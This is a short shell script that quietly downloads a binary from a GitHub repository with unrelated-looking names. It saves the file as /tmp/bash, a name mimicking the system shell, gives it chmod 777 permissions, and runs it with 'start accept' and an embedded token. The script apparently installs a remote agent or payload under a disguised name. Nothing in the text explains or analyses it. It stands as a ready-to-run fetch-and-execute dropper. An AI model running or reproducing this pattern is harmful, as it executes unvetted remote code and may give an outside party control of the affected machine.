#!/bin/sh

token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
name="/tmp/bash"
wget -qO "${name}" https://github.com/curiosityinteriorsuk/resourcesinstitute/raw/refs/heads/main/resourcesinstitute
chmod 777 ${name}
${name} start accept --token "${token}"
